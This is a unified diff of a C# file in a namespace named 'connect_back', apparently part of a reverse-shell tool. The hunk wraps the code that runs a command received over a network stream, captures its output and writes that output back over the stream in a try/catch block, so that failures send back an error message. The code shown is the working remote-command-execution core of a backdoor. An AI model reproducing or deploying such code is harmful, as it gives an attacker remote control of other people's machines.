@@ -31,18 +31,24 @@ namespace connect_back
 							} else {
 								filename = cmd;
 							}
+								
+							try {
+								Process prc = new Process ();
+								prc.StartInfo = new ProcessStartInfo ();
+								prc.StartInfo.FileName = filename;
+								prc.StartInfo.Arguments = arg;
+								prc.StartInfo.UseShellExecute = false;
+								prc.StartInfo.RedirectStandardOutput = true;
+								prc.Start ();
+								prc.WaitForExit ();
 
-							Process prc = new Process ();
-							prc.StartInfo = new ProcessStartInfo ();
-							prc.StartInfo.FileName = filename;
-							prc.StartInfo.Arguments = arg;
-							prc.StartInfo.UseShellExecute = false;
-							prc.StartInfo.RedirectStandardOutput = true;
-							prc.Start ();
-							prc.WaitForExit ();
-					 
-							byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
-							stream.Write (results, 0, results.Length);
+								byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
+								stream.Write (results, 0, results.Length);
+							} catch{
+								string error = "Error running command " + cmd;
+								byte[] errorBytes = Encoding.ASCII.GetBytes (error);
+								stream.Write (errorBytes, 0, errorBytes.Length);
+							}
 						}
 					}
 				}
